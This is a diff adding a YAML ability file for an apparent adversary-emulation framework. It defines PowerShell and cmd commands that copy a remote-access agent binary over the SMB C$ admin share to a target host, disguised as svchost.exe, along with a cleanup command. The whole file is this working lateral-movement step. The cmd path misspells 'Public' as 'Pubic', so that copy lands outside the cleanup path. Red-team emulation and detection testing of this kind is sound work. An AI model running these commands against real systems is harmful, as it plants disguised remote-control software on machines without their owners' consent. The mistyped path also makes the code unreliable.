@@ -1,0 +1,22 @@
+---
+
+- id: c5e75d70-09ae-469f-8717-621a1b7ef946
+  name: Copy 54ndc47 (SMB)
+  description: Copy 54ndc47 to remote host (SMB)
+  tactic: lateral-movement
+  technique:
+    attack_id: T1105
+    name: Remote File Copy
+  platforms:
+    windows:
+      psh:
+        command: |
+          $path = $env:USERPROFILE+"\sandcat.go-windows";
+          $copy = Copy-Item -Path $path -Destination "\\#{remote.host.ip}\C$\Users\Public\svchost.exe" -Force;
+        payload: sandcat.go-windows
+        cleanup: |
+          Remove-Item -Path "\\#{remote.host.ip}\C$\Users\Public\svchost.exe" -Force
+      cmd:
+        command: |
+          copy /B /Y sandcat.go-windows \\#{remote.host.ip}\c$\Users\Pubic\svchost.exe;
+        payload: sandcat.go-windows
